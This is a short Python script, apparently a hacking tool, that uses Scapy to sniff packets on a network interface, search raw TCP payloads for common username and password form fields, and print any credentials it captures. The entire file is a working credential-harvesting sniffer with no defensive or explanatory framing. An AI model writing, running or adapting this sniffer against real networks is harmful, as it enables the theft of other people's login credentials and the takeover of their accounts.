from scapy.all import *
from urllib import  parse
import re
import sys
iface = ""


def get_login_pass(body):
    user = None
    password = None

    userfields = ['exampleInputEmail1', 'username', 'login_usr']
    passfields = ['exampleInputPassword1', 'password', 'login_pwd', 'login_pwd_text']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            # if user name found, store it
            user = login_re.group()

    for passwd in passfields:
        pass_re = re.search('(%s=[^&]+)' % passwd, body, re.IGNORECASE)
        if pass_re:
            # if password  found, store it
            password = pass_re.group()

    if user and password is not None:

        return user, password


def pkt_parser(packet):
    if packet.haslayer(TCP) and  packet.haslayer(Raw) and packet.haslayer(IP):

        # Extract the body of the packet
        body = str(packet[TCP].payload)
        # send body to function for extraction
        user_pass = get_login_pass(body)

        if user_pass is not None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))

        else:
            #print("Couldn't find username and password")
            pass

try:
    #start sniffing on interface
    sniff(iface=iface, prn=pkt_parser, store=0)

except KeyboardInterrupt:
    print('Exiting')
    sys.exit(1)